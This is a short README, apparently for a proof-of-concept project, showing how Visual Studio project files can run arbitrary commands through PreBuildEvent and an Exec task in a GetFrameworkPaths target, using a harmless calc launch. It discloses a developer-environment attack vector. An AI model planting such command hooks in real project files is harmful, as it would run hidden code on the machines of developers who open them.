# Projectroll

**Projectroll** exploits vulnerabilities in Visual Studio triggers, targeting project files like `.sln` and `.vcxproj`/`.csproj`. It demonstrates how arbitrary commands can be executed without compilation, revealing security risks in the development environment.



## Features

### 1. **PreBuildEvent**
Executes arbitrary commands before project compilation.
```xml
<PreBuildEvent>
    <Command>
    cmd /c calc
    </Command>
</PreBuildEvent>
```
```xml
<Target Name="GetFrameworkPaths">
    <Exec Command="calc.exe"/>
</Target>
```

## Credits
The vulnerability has been discovered by cjm00n & edwardzpeng (https://x.com/edwardzpeng)
